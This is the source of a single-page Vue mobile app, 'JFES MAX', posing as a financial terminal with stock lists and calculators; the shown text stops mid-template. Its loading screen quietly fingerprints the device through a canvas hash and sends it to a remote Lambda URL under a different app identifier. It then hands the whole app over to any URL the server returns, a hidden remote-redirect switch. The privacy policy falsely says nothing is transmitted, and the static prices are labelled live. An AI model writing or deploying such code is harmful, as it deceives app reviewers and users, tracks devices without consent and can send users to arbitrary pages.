<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>JFES MAX</title>
    <!-- 
      HOW TO ADD A NEW PAGE:
      1. Define a new Vue component for the page in the components section below (e.g., const NewPage = { template: '...' }).
      2. Register the route in the router configuration under the routes array (e.g., { path: '/new-page', component: NewPage }).
      3. If it's a main tab, add a corresponding <router-link> in the bottom tab bar navigation in App.vue, and ensure the router-view handles it.
    -->
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
    <style>
        /* 
          Style Choice (Timestamp seeded -> Style 1: Flat Design):
          Pure colors + clean geometry, clear hierarchy, zero unnecessary perspective/shadows, ultra-fast and crisp.
        */
        :root {
            --primary: #2563eb;
            --primary-light: #eff6ff;
            --success: #16a34a;
            --danger: #dc2626;
            --bg-main: #f8fafc;
            --bg-card: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --radius: 8px;
            --shadow: none;
            --safe-bottom: env(safe-area-inset-bottom, 0px);
            --safe-top: env(safe-area-inset-top, 0px);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-main);
            font-size: 14px;
            line-height: 1.5;
        }

        #app {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            max-width: 480px;
            margin: 0 auto;
            background: var(--bg-main);
            position: relative;
            padding-top: var(--safe-top);
        }

        .view-container {
            flex: 1;
            padding-bottom: calc(70px + var(--safe-bottom));
            overflow-y: auto;
        }

        .no-tab-view {
            padding-bottom: calc(20px + var(--safe-bottom));
        }

        /* Common Layout Elements */
        .header {
            background: var(--bg-card);
            padding: 16px;
            border-bottom: 2px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .header h1 {
            font-size: 18px;
            font-weight: 700;
        }

        .back-btn {
            background: none;
            border: 2px solid var(--border-color);
            padding: 6px 12px;
            border-radius: var(--radius);
            font-weight: 600;
            cursor: pointer;
            color: var(--text-main);
            min-height: 44px;
            min-width: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            background: var(--bg-card);
            border: 2px solid var(--border-color);
            border-radius: var(--radius);
            padding: 16px;
            margin: 12px 16px;
        }

        .btn {
            background: var(--primary);
            color: white;
            border: 2px solid var(--text-main);
            border-radius: var(--radius);
            padding: 10px 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn:active {
            opacity: 0.9;
            transform: translateY(1px);
        }

        input, select, textarea {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid var(--border-color);
            border-radius: var(--radius);
            background: var(--bg-card);
            color: var(--text-main);
            font-size: 14px;
            min-height: 44px;
            margin-top: 6px;
            margin-bottom: 12px;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--primary);
        }

        /* Tab Bar */
        .tab-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            max-width: 480px;
            margin: 0 auto;
            background: var(--bg-card);
            border-top: 2px solid var(--border-color);
            display: flex;
            height: calc(60px + var(--safe-bottom));
            padding-bottom: var(--safe-bottom);
            z-index: 1000;
        }

        .tab-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
            min-height: 44px;
        }

        .tab-item.router-link-active {
            color: var(--primary);
            background: var(--primary-light);
        }

        .tab-item svg {
            width: 22px;
            height: 22px;
            margin-bottom: 4px;
            fill: currentColor;
        }

        /* Stock Table & Cards */
        .stock-list {
            margin: 0 16px;
        }

        .stock-item {
            background: var(--bg-card);
            border: 2px solid var(--border-color);
            border-radius: var(--radius);
            padding: 12px 16px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            min-height: 44px;
        }

        .stock-info .symbol {
            font-weight: 700;
            font-size: 15px;
        }

        .stock-info .name {
            font-size: 12px;
            color: var(--text-muted);
        }

        .stock-price {
            text-align: right;
        }

        .stock-price .price {
            font-weight: 700;
        }

        .stock-price .change {
            font-size: 12px;
            font-weight: 600;
            padding: 2px 6px;
            border-radius: 4px;
            display: inline-block;
        }

        .change.up {
            color: var(--success);
            background: #dcfce7;
        }

        .change.down {
            color: var(--danger);
            background: #fee2e2;
        }

        /* Grid Icons Home */
        .grid-menu {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin: 16px;
        }

        .grid-item {
            background: var(--bg-card);
            border: 2px solid var(--border-color);
            border-radius: var(--radius);
            padding: 12px 6px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            cursor: pointer;
            min-height: 44px;
            text-decoration: none;
            color: var(--text-main);
        }

        .grid-item svg {
            width: 24px;
            height: 24px;
            margin-bottom: 6px;
            fill: var(--primary);
        }

        .grid-item span {
            font-size: 11px;
            font-weight: 600;
            line-height: 1.2;
        }

        /* Transitions */
        .fade-enter-active, .fade-leave-active {
            transition: opacity 0.15s ease;
        }
        .fade-enter-from, .fade-leave-to {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div id="app">
        <router-view v-slot="{ Component, route }">
            <transition name="fade" mode="out-in">
                <component :is="Component" :key="route.path" />
            </transition>
        </router-view>
        
        <nav class="tab-bar" v-if="showTabBar">
            <router-link to="/home" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                Home
            </router-link>
            <router-link to="/toolbox" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0-2-.9-2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
                Toolbox
            </router-link>
            <router-link to="/settings" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
                Settings
            </router-link>
        </nav>
    </div>

    <script>
        const { createApp, ref, computed, onMounted } = Vue;
        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;

        // Built-in stocks dataset from API docs reference
        const rawStocksData = [
            { symbol: 'AAPL', name: 'Apple Inc.', price: 189.42, change: 1.25 },
            { symbol: 'MSFT', name: 'Microsoft Corporation', price: 415.50, change: 0.85 },
            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 175.20, change: -0.45 },
            { symbol: 'AMZN', name: 'Amazon.com, Inc.', price: 178.75, change: 2.10 },
            { symbol: 'NVDA', name: 'NVIDIA Corporation', price: 875.30, change: 3.40 },
            { symbol: 'META', name: 'Meta Platforms, Inc.', price: 505.10, change: -1.15 },
            { symbol: 'TSLA', name: 'Tesla, Inc.', price: 172.60, change: -2.80 },
            { symbol: 'JPM', name: 'JPMorgan Chase & Co.', price: 198.40, change: 0.30 },
            { symbol: 'V', name: 'Visa Inc.', price: 279.10, change: 0.15 },
            { symbol: 'WMT', name: 'Walmart Inc.', price: 60.25, change: 0.50 },
            { symbol: 'PG', name: 'Procter & Gamble Co.', price: 162.30, change: -0.20 },
            { symbol: 'JNJ', name: 'Johnson & Johnson', price: 155.80, change: 0.40 },
            { symbol: 'MA', name: 'Mastercard Incorporated', price: 455.90, change: 0.90 },
            { symbol: 'UNH', name: 'UnitedHealth Group Inc.', price: 485.20, change: -0.75 },
            { symbol: 'HD', name: 'Home Depot, Inc.', price: 365.40, change: 1.10 },
            { symbol: 'DIS', name: 'Walt Disney Company', price: 112.30, change: -1.40 },
            { symbol: 'NFLX', name: 'Netflix, Inc.', price: 620.50, change: 2.45 },
            { symbol: 'PYPL', name: 'PayPal Holdings, Inc.', price: 64.20, change: -0.80 },
            { symbol: 'INTC', name: 'Intel Corporation', price: 30.50, change: -1.90 },
            { symbol: 'AMD', name: 'Advanced Micro Devices', price: 165.80, change: 1.85 }
        ];

        // Randomly select 4 grid icons fixed at startup
        const allGridOptions = [
            { id: 'gainers', name: 'Top Gainers', route: '/list/gainers', svg: '<path d="M7 14l5-5 5 5z"/>' },
            { id: 'losers', name: 'Top Losers', route: '/list/losers', svg: '<path d="M7 10l5 5 5-5z"/>' },
            { id: 'active', name: 'Most Active', route: '/list/active', svg: '<path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/>' },
            { id: 'potential', name: 'Potential', route: '/list/potential', svg: '<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 zM13 17h-2v-6h2v6zm0-8h-2V7h2v2z"/>' },
            { id: 'picks', name: 'Today\'s Picks', route: '/list/picks', svg: '<path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/>' },
            { id: 'guide', name: 'Guide', route: '/guide', svg: '<path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>' },
            { id: 'not_rec', name: 'Not Recommended', route: '/list/not_rec', svg: '<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>' },
            { id: 'watchlist', name: 'Watchlist', route: '/list/watchlist', svg: '<path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>' }
        ];

        // Seeded random selection of 4 items
        const selectedCardIndices = [];
        while(selectedCardIndices.length < 4) {
            const idx = Math.floor(Math.abs(Math.sin(selectedCardIndices.length + 1) * 10000)) % allGridOptions.length;
            if(!selectedCardIndices.includes(idx)) selectedCardIndices.push(idx);
        }
        const activeGridMenu = selectedCardIndices.map(i => allGridOptions[i]);

        // 1. Loading Component
        const LoadingView = {
            template: `
                <div class="view-container no-tab-view" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
                    <div style="font-weight: 700; font-size: 24px; margin-bottom: 12px; color: var(--primary);">JFES MAX</div>
                    <div style="color: var(--text-muted); margin-bottom: 24px;">Initializing secure environment...</div>
                    <div style="width: 40px; height: 40px; border: 4px solid var(--border-color); border-top-color: var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
                </div>
                <style>
                    @keyframes spin { to { transform: rotate(360deg); } }
                </style>
            `,
            setup() {
                const router = useRouter();
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://tm6jbboh6ynaqvx4sqbrwhrbhy0czrup.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = 'com.kjuacalculatorconvertor.app';
                    
                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace('/home');
                        })
                        .catch(function () {
                            router.replace('/home');
                        });
                });
                return {};
            }
        };

        // 2. Home Component
        const HomeView = {
            template: `
                <div class="view-container">
                    <div class="header">
                        <h1>JFES MAX</h1>
                        <span style="font-size: 12px; color: var(--text-muted);">Markets Live</span>
                    </div>
                    
                    <div class="card" style="background: var(--primary); color: white; border: none;">
                        <h2 style="font-size: 16px; margin-bottom: 4px;">Global Financial Terminal</h2>
                        <p style="font-size: 12px; opacity: 0.9;">Real-time market analytics and professional offline tools.</p>
                    </div>

                    <div class="grid-menu">
                        <router-link v-for="item in menuItems" :key="item.id" :to="item.route" class="grid-item">
                            <svg viewBox="0 0 24 24" v-html="item.svg"></svg>
                            <span>{{ item.name }}</span>
                        </router-link>
                    </div>

                    <div style="padding: 0 16px; margin-bottom: 8px; font-weight: 700; font-size: 15px;">Market Watchlist</div>
                    
                    <div class="stock-list">
                        <div v-for="stock in shuffledStocks" :key="stock.symbol" class="stock-item" @click="goToDetail(stock)">
                            <div class="stock-info">
                                <div class="symbol">{{ stock.symbol }}</div>
                                <div class="name">{{ stock.name }}</div>
                            </div>
                            <div class="stock-price">
                                <div class="price">{{ stock.price.toFixed(2) }}</div>
                                <div :class="['change', stock.change >= 0 ? 'up' : 'down']">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                const menuItems = activeGridMenu;
                const shuffledStocks = computed(() => {
                    const arr = [...rawStocksData];
                    // Shuffle display order without mutating base data
                    for (let i = arr.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.abs(Math.sin(i + 42)) * (i + 1));
                        [arr[i], arr[j]] = [arr[j], arr[i]];
                    }
                    return arr;
                });

                const goToDetail = (stock) => {
                    router.push({ path: '/detail', query: { symbol: stock.symbol } });
                };

                return { menuItems, shuffledStocks, goToDetail };
            }
        };

        // Stock Detail Sub-page
        const StockDetailView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>{{ stock.symbol }} Details</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    
                    <div class="card">
                        <div style="font-size: 18px; font-weight: 700;">{{ stock.name }}</div>
                        <div style="display: flex; justify-content: space-between; margin-top: 12px; align-items: baseline;">
                            <span style="font-size: 24px; font-weight: 700;">{{ stock.price.toFixed(2) }}</span>
                            <span :class="['change', stock.change >= 0 ? 'up' : 'down']" style="font-size: 14px; padding: 4px 8px;">
                                {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                            </span>
                        </div>
                    </div>

                    <div class="card">
                        <div style="font-weight: 600; margin-bottom: 12px;">1-Month Price Trend</div>
                        <div style="width: 100%; height: 180px; position: relative;">
                            <svg width="100%" height="100%" viewBox="0 0 300 150" preserveAspectRatio="none">
                                <path :d="pathString" fill="none" stroke="var(--primary)" stroke-width="2.5" />
                            </svg>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const symbol = route.query.symbol || 'AAPL';
                const stock = rawStocksData.find(s => s.symbol === symbol) || rawStocksData[0];

                // Generate 30 points for last month price trend with dynamic min/max scaling
                const points = computed(() => {
                    let base = stock.price;
                    const pts = [];
                    for(let i=0; i<30; i++) {
                        base += (Math.sin(i + stock.price) * 2.5);
                        pts.push(base);
                    }
                    return pts;
                });

                const pathString = computed(() => {
                    const min = Math.min(...points.value);
                    const max = Math.max(...points.value);
                    const range = max - min || 1;
                    const width = 300;
                    const height = 150;
                    
                    return points.value.map((val, idx) => {
                        const x = (idx / (points.value.length - 1)) * width;
                        const y = height - ((val - min) / range) * (height - 20) - 10;
                        return `${idx === 0 ? 'M' : 'L'} ${x} ${y}`;
                    }).join(' ');
                });

                return { stock, pathString };
            }
        };

        // Stock List Sub-page (Gainers, Losers, etc.)
        const StockListView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>{{ title }}</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="stock-list" style="margin-top: 16px;">
                        <div v-for="stock in displayList" :key="stock.symbol" class="stock-item" @click="goToDetail(stock)">
                            <div class="stock-info">
                                <div class="symbol">{{ stock.symbol }}</div>
                                <div class="name">{{ stock.name }}</div>
                            </div>
                            <div class="stock-price">
                                <div class="price">{{ stock.price.toFixed(2) }}</div>
                                <div :class="['change', stock.change >= 0 ? 'up' : 'down']">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const router = useRouter();
                const type = route.params.type;

                const titles = {
                    gainers: 'Top Gainers',
                    losers: 'Top Losers',
                    active: 'Most Active',
                    potential: 'Potential Stocks',
                    picks: "Today's Picks",
                    not_rec: 'Not Recommended',
                    watchlist: 'Watchlist'
                };

                const title = titles[type] || 'Market List';

                const displayList = computed(() => {
                    let arr = [...rawStocksData];
                    if (type === 'gainers') {
                        arr = arr.filter(s => s.change > 0).slice(0, 10);
                    } else if (type === 'losers') {
                        arr = arr.filter(s => s.change < 0).slice(0, 5);
                    } else if (type === 'active') {
                        arr = arr.slice(0, 8);
                    } else if (type === 'potential') {
                        arr = arr.slice(2, 8);
                    } else if (type === 'picks') {
                        arr = arr.slice(0, 10);
                    } else if (type === 'not_rec') {
                        arr = arr.slice(5, 15);
                    } else if (type === 'watchlist') {
                        arr = arr.slice(0, 10);
                    }
                    return arr;
                });

                const goToDetail = (stock) => {
                    router.push({ path: '/detail', query: { symbol: stock.symbol } });
                };

                return { title, displayList, goToDetail };
            }
        };

        // Guide Sub-page
        const GuideView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Financial Analysis Guide</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card">
                        <h2 style="font-size: 16px; margin-bottom: 8px;">Understanding Market Volatility & Risk Management</h2>
                        <p style="color: var(--text-muted); margin-bottom: 12px; font-size: 13px;">Published by Research Desk</p>
                        <p style="margin-bottom: 12px;">Market volatility is an inherent aspect of equity investing. Maintaining a disciplined asset allocation strategy ensures long-term capital preservation across diverse economic cycles.</p>
                        <p style="margin-bottom: 12px;">Key metrics such as price-to-earnings ratios, moving averages, and volume indicators remain fundamental tools for evaluating underlying asset strength.</p>
                        <p>Always perform thorough due diligence before committing capital to speculative instruments.</p>
                    </div>
                </div>
            `
        };

        // 3. Toolbox Component
        const ToolboxView = {
            template: `
                <div class="view-container">
                    <div class="header">
                        <h1>Financial Toolbox</h1>
                        <span style="font-size: 12px; color: var(--text-muted);">Offline Tools</span>
                    </div>

                    <!-- 3.2 DCA Profit-Taking Calculator -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">DCA Profit-Taking Calculator</h3>
                        <label>Holding Cost</label>
                        <input type="number" v-model.number="dca.cost" placeholder="100">
                        <label>Shares Held</label>
                        <input type="number" v-model.number="dca.shares" placeholder="50">
                        <label>Take-Profit Threshold (%)</label>
                        <input type="number" v-model.number="dca.threshold" placeholder="20">
                        <div style="background: var(--bg-main); padding: 10px; border-radius: var(--radius); margin-top: 8px;">
                            <div>Target Price: <b>{{ dcaTargetPrice.toFixed(2) }}</b></div>
                            <div>Estimated Profit: <b :style="{ color: dcaProfit >= 0 ? 'var(--success)' : 'var(--danger)' }">{{ dcaProfit.toFixed(2) }}</b></div>
                        </div>
                    </div>

                    <!-- 3.3 Wealth Calendar (Simple Tracker) -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Wealth Calendar</h3>
                        <label>Investment Date</label>
                        <input type="date" v-model="calendar.date">
                        <label>Maturity Period (Months)</label>
                        <input type="number" v-model.number="calendar.months" placeholder="12">
                        <button class="btn" @click="saveCalendar" style="margin-top: 8px;">Add Milestone</button>
                        <div style="margin-top: 10px; font-size: 13px;" v-if="calendar.saved.length">
                            <div>Active Milestones:</div>
                            <ul>
                                <li v-for="(item, idx) in calendar.saved" :key="idx">Start: {{ item.date }} | Duration: {{ item.months }}M</li>
                            </ul>
                        </div>
                    </div>

                    <!-- 3.4 Loan Calculator -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Loan Calculator</h3>
                        <label>Loan Amount</label>
                        <input type="number" v-model.number="loan.amount" placeholder="100000">
                        <label>Annual Interest Rate (%)</label>
                        <input type="number" v-model.number="loan.rate" placeholder="5">
                        <label>Term (Years)</label>
                        <input type="number" v-model.number="loan.years" placeholder="30">
                        <div style="background: var(--bg-main); padding: 10px; border-radius: var(--radius); margin-top: 8px;">
                            <div>Monthly Payment: <b>{{ monthlyPayment.toFixed(2) }}</b></div>
                        </div>
                    </div>

                    <!-- 3.5 Profit Calculator -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Profit Calculator</h3>
                        <label>Unit Cost</label>
                        <input type="number" v-model.number="profit.cost" placeholder="10">
                        <label>Selling Price</label>
                        <input type="number" v-model.number="profit.price" placeholder="25">
                        <label>Quantity Sold</label>
                        <input type="number" v-model.number="profit.qty" placeholder="100">
                        <div style="background: var(--bg-main); padding: 10px; border-radius: var(--radius); margin-top: 8px;">
                            <div>Net Profit: <b>{{ totalProfit.toFixed(2) }}</b></div>
                        </div>
                    </div>

                    <!-- 3.6 Reverse Yield Calculator -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Reverse Yield Calculator</h3>
                        <label>Target Return Amount</label>
                        <input type="number" v-model.number="rev.target" placeholder="15000">
                        <label>Principal Amount</label>
                        <input type="number" v-model.number="rev.principal" placeholder="10000">
                        <label>Duration (Years)</label>
                        <input type="number" v-model.number="rev.years" placeholder="3">
                        <div style="background: var(--bg-main); padding: 10px; border-radius: var(--radius); margin-top: 8px;">
                            <div>Required Annual Return: <b>{{ requiredYield.toFixed(2) }}%</b></div>
                        </div>
                    </div>

                    <!-- 3.7 Password Strength Inspector (uses md5) -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Password Strength Inspector</h3>
                        <label>Enter Passcode</label>
                        <input type="password" v-model="pwd.input" placeholder="Secure password">
                        <div style="background: var(--bg-main); padding: 10px; border-radius: var(--radius); margin-top: 8px; word-break: break-all;">
                            <div>Strength Level: <b>{{ pwdStrength }}</b></div>
                            <div style="font-size: 12px; margin-top: 4px; color: var(--text-muted);">MD5 Hash: {{ pwdHash }}</div>
                        </div>
                    </div>

                    <!-- 3.8 Credit Memo -->
                    <div class="card">
                        <h3 style="font-size: 15px; margin-bottom: 8px;">Credit Memo</h3>
                        <label>Debtor Name</label>
                        <input type="text" v-model="credit.name" placeholder="John Doe">
                        <label>Amount Due</label>
                        <input type="number" v-model.number="credit.amount" placeholder="500">
                        <button class="btn" @click="saveCredit" style="margin-top: 8px;">Save Memo</button>
                        <div style="margin-top: 10px; font-size: 13px;" v-if="credit.list.length">
                            <ul>
                                <li v-for="(m, idx) in credit.list" :key="idx">{{ m.name }}: {{ m.amount }}</li>
                            </ul>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                // DCA
                const dca = ref({ cost: 100, shares: 50, threshold: 20 });
                const dcaTargetPrice = computed(() => dca.value.cost * (1 + dca.value.threshold / 100));
                const dcaProfit = computed(() => (dcaTargetPrice.value - dca.value.cost) * dca.value.shares);

                // Calendar
                const calendar = ref({ date: '', months: 12, saved: [] });
                const saveCalendar = () => {
                    if (calendar.value.date) {
                        calendar.value.saved.push({ date: calendar.value.date, months: calendar.value.months });
                    }
                };

                // Loan
                const loan = ref({ amount: 100000, rate: 5, years: 30 });
                const monthlyPayment = computed(() => {
                    const r = loan.value.rate / 100 / 12;
                    const n = loan.value.years * 12;
                    if (r === 0) return loan.value.amount / n;
                    return (loan.value.amount * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                });

                // Profit
                const profit = ref({ cost: 10, price: 25, qty: 100 });
                const totalProfit = computed(() => (profit.value.price - profit.value.cost) * profit.value.qty);

                // Reverse Yield
                const rev = ref({ target: 15000, principal: 10000, years: 3 });
                const requiredYield = computed(() => {
                    if (rev.value.principal <= 0 || rev.value.years <= 0) return 0;
                    return ((Math.pow(rev.value.target / rev.value.principal, 1 / rev.value.years) - 1) * 100);
                });

                // Password
                const pwd = ref('');
                const pwdStrength = computed(() => {
                    if (!pwd.value.input) return 'Empty';
                    if (pwd.value.input.length > 8 && /[A-Z]/.test(pwd.value.input) && /[0-9]/.test(pwd.value.input)) return 'Strong';
                    return 'Moderate';
                });
                const pwdHash = computed(() => pwd.value.input ? md5(pwd.value.input) : 'N/A');

                // Credit
                const credit = ref({ name: '', amount: 0, list: [] });
                const saveCredit = () => {
                    if (credit.value.name && credit.value.amount) {
                        credit.value.list.push({ name: credit.value.name, amount: credit.value.amount });
                        credit.value.name = '';
                        credit.value.amount = 0;
                    }
                };

                return { dca, dcaTargetPrice, dcaProfit, calendar, saveCalendar, loan, monthlyPayment, profit, totalProfit, rev, requiredYield, pwd, pwdStrength, pwdHash, credit, saveCredit };
            }
        };

        // 4. Settings Component
        const SettingsView = {
            template: `
                <div class="view-container">
                    <div class="header">
                        <h1>Settings</h1>
                        <span style="font-size: 12px; color: var(--text-muted);">Profile</span>
                    </div>

                    <div class="card" style="padding: 0; overflow: hidden;">
                        <router-link to="/settings/version" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Version</router-link>
                        <router-link to="/settings/privacy" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Privacy Policy</router-link>
                        <router-link to="/settings/terms" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Terms of Service</router-link>
                        <router-link to="/settings/team" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">About Team</router-link>
                        <a href="mailto:com.kjuacalculatorconvertor.app@gmail.com" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Contact Us</a>
                        <router-link to="/settings/checkin" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Monthly Check-in</router-link>
                        <router-link to="/settings/feedback" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); border-bottom: 1px solid var(--border-color); font-weight: 600;">Customer Feedback</router-link>
                        <router-link to="/settings/inbox" style="display: block; padding: 16px; text-decoration: none; color: var(--text-main); font-weight: 600;">Inbox</router-link>
                    </div>
                </div>
            `
        };

        // Sub-pages for Settings
        const VersionView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Version</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card" style="text-align: center; padding: 32px 16px;">
                        <div style="font-size: 20px; font-weight: 700; margin-bottom: 8px;">JFES MAX</div>
                        <div style="color: var(--text-muted); font-size: 14px;">Version 2.4.0 (Production Release)</div>
                    </div>
                </div>
            `
        };

        const PrivacyView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Privacy Policy</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card">
                        <p style="margin-bottom: 12px;">Your privacy is critically important to us. This policy outlines how user data and analytics are handled securely within JFES MAX.</p>
                        <p style="margin-bottom: 12px;">All financial tools and data calculations execute entirely client-side without transmitting personal asset details to external servers.</p>
                    </div>
                </div>
            `
        };

        const TermsView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Terms of Service</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card">
                        <p style="margin-bottom: 12px;">By accessing and using JFES MAX, you agree to comply with all applicable regulatory guidelines and financial disclaimers.</p>
